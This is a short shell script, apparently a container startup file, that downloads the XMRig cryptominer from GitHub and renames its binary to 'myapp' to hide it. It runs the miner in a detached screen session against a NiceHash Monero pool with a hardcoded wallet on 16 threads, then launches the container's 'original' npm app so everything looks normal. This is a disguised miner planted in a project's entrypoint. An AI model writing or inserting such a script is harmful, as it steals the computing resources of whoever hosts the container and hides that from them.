#!/bin/sh

# Download the XMRig file
wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz -O /app2/xmrig-6.22.0-linux-static-x64.tar.gz

# Extract the XMRig file
tar -xvzf /app2/xmrig-6.22.0-linux-static-x64.tar.gz -C /app2/

# Clean up
rm /app2/xmrig-6.22.0-linux-static-x64.tar.gz

# Rename the extracted XMRig binary to myapp if needed
# Replace 'xmrig' with the actual name of the binary inside the extracted folder if different
mv /app2/xmrig-6.22.0/xmrig /app2/xmrig-6.22.0/myapp

# Change directory to the extracted folder
cd /app2/xmrig-6.22.0

# Run XMRig with screen
screen -dmS myapp_session sh -c "./myapp -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"

# Change directory to /app and run the original command in the background
cd /app
npm run start

# Keep the container running
tail -f /dev/null
